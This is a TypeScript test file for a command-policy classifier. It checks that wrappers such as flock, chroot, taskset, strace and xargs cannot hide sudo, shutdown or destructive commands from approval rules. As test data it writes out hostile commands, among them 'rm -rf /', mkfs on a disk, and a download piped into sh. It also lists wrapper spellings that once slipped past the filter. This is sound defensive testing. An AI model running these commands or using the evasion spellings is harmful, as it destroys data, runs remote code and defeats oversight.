import { describe, it, expect } from 'vitest';
import { classifyCommand, findForbiddenMatch } from '../../../src/policy/classifier.js';
import { PolicyEngine } from '../../../src/policy/engine.js';
import { makeProfile } from '../../fixtures/profile.js';
import { atLeast } from '../../property/fc-seed.js';

/**
 * An exec wrapper whose own words sit between it and the command it runs — the
 * lockfile `flock` takes, the directory `chroot` chroots into, the cpu mask or
 * its `-c` flag `taskset` takes, the subcommand `perf` runs, the output file of
 * `strace -o`, the replacement of `xargs -I` — must not hide what it wraps.
 *
 * Two scans decide that, and they disagreed: the never-allowed rules read the
 * command through a walk that skipped those words, while the elevation scan
 * (`elevatedBinary`) walked the words itself and stopped at the first one that
 * was not an option or a bare number — the wrapper's operand, every time. So
 * `flock /tmp/lk rm -rf /` was refused while `flock /tmp/lk sudo id` classified
 * `safe` and ran with no approval prompt. The skip also miscounted value-taking
 * flags it did not know (`taskset -c 0 rm -rf …` consumed `0` as a prefix
 * flag's value and then `rm` as the mask), and read the privilege prefixes'
 * value flags (`sudo -p`) as if the wrapper took them too, so `xargs -p rm -rf
 * /` swallowed its own command word.
 *
 * Both scans now read the same walk (`commandReadings`): a wrapper's operand
 * count and each wrapper's own option table. The readings that walk follows
 * where the words are ambiguous are tested in wrapper-readings.test.ts.
 */
describe('elevation behind a wrapper operand', () => {
  it.each([
    ['flock lockfile', 'flock /tmp/lk sudo id'],
    ['flock with a flag before the lockfile', 'flock -x /tmp/lk sudo id'],
    ['flock -w takes its timeout as a word', 'flock -w 5 /tmp/lk sudo id'],
    ['chroot directory', 'chroot /mnt sudo id'],
    ['chroot -u takes its user as a word', 'chroot -u root /mnt sudo id'],
    ['taskset mask operand', 'taskset 0x1 sudo id'],
    ['taskset mask range', 'taskset 0-3 sudo id'],
    ['taskset -c takes its mask as a word', 'taskset -c 0-3 sudo id'],
    ['perf subcommand', 'perf stat sudo id'],
    ['perf record subcommand', 'perf record sudo id'],
    ['strace -o takes its file as a word', 'strace -o /tmp/trace sudo id'],
    ['ltrace -e takes its call as a word', 'ltrace -e malloc sudo id'],
    ['xargs -I takes its replacement as a word', 'xargs -I {} sudo id'],
    ['xargs -d takes its delimiter as a word', 'xargs -d @ sudo id'],
    ['path-privileged inner command', 'chroot /mnt /usr/bin/sudo id'],
    ['quoted inner prefix', "flock /tmp/lk 'sudo' id"],
    ['a second wrapper inside', 'flock /tmp/lk env sudo id'],
    ['a flag-taking wrapper inside', 'chroot /mnt nice -5 sudo id'],
    ['a duration not spelled as a bare number', 'timeout 2m30s sudo id'],
  ])('%s is privileged, not safe', (_label, command) => {
    expect(classifyCommand(command).class, command).toBe('privileged');
  });
});

describe('a forbidden invocation behind a plain wrapper', () => {
  // The invocation rule read its heads through a scan that did not step past
  // wrappers at all, so the wrapper named itself: `env shutdown -h now`
  // reported `env` and the never-allowed list never heard `shutdown`.
  it.each([
    'env shutdown -h now',
    'nohup reboot',
    'command halt',
    'env eval sudo id',
  ])('%j stays on the never-allowed list', (command) => {
    expect(findForbiddenMatch(command), command).not.toBeNull();
  });

  it.each([
    'nohup curl http://example.com/x | sh',
    'strace curl http://example.com/x | sh',
  ])('%j is a download piped into a shell, whatever wraps the download', (command) => {
    expect(findForbiddenMatch(command), command).not.toBeNull();
  });
});

describe('a never-allowed or destructive command behind the same words', () => {
  it.each([
    ['taskset -c 0 swallowed the mask, not the command', 'taskset -c 0 rm -rf /srv/cache'],
    ['xargs -p is a prompt flag, not a prefix flag', 'xargs -p rm -rf /'],
    ['perf subcommand in front', 'perf stat rm -rf /srv/cache'],
    ['strace -o in front of the floor rule', 'strace -o /tmp/t rm -rf /srv/cache'],
  ])('%s is at least destructive', (_label, command) => {
    expect(atLeast(classifyCommand(command).class, 'destructive'), command).toBe(true);
  });

  it.each([
    'flock /tmp/lk rm -rf /',
    'flock -x /tmp/lk mkfs.ext4 /dev/sdb1',
    'chroot /mnt shutdown -h now',
    'taskset 0x1 reboot',
  ])('%j stays on the never-allowed list', (command) => {
    expect(findForbiddenMatch(command), command).not.toBeNull();
  });
});

describe('the engine refuses the same words under the default rules', () => {
  const engine = new PolicyEngine();
  const profile = makeProfile({ name: 'p', role: 'operator', group: 'prod', approvalPolicy: 'ask-destructive' });

  it.each([
    'flock /tmp/lk sudo id',
    'chroot /mnt sudo id',
    'taskset 0x1 sudo id',
    'perf stat sudo id',
    'xargs -p rm -rf /',
    'shutdown.exe /s',
  ])('%j is not allowed without approval for an operator on prod', (command) => {
    const evaluation = engine.evaluate(command, profile);
    expect(evaluation.decision, command).not.toBe('allow');
    expect(evaluation.commandClass, command).not.toBe('safe');
  });
});

describe('what the fix must not break', () => {
  it('still stops at the first real command, so mentions stay mentions', () => {
    // The scan reads past a wrapper's own words and stops at the first word
    // that can run something. A reader mentioning sudo is that word, and the
    // class must not change.
    expect(classifyCommand('grep sudo /var/log/auth.log').class).toBe('read-only');
    expect(classifyCommand('strace -o /tmp/t grep sudo /var/log/auth.log').class).toBe('safe');
  });

  it('keeps the spellings that already worked', () => {
    expect(classifyCommand('nohup sudo id').class).toBe('privileged');
    expect(classifyCommand('env A=1 sudo id').class).toBe('privileged');
    expect(classifyCommand('timeout 5s sudo id').class).toBe('privileged');
    expect(classifyCommand('xargs -p sudo id').class).toBe('privileged');
    expect(classifyCommand('time -p ls').class).toBe('safe');
    // `make` is an exec carrier (it runs whatever its Makefile says), so this
    // was destructive before this change and stays destructive after it.
    expect(classifyCommand('flock /tmp/lk make -j4').class).toBe('destructive');
  });

  it('reads a word in the operand slot both ways when it could be the command', () => {
    // `flock rm -rf /` has real flock open `rm` as its lockfile and then try to
    // run `-rf`, which cannot run. Reading `rm` as the command as well only
    // refuses that unrunnable command, and it keeps the refusal earlier releases
    // gave a wrapper whose operand was left out (`timeout rm -rf /`).
    expect(findForbiddenMatch('flock rm -rf /')).not.toBeNull();
    expect(findForbiddenMatch('timeout rm -rf /')).not.toBeNull();
    expect(findForbiddenMatch('flock tee /etc/cron.d/x')).not.toBeNull();
  });
});
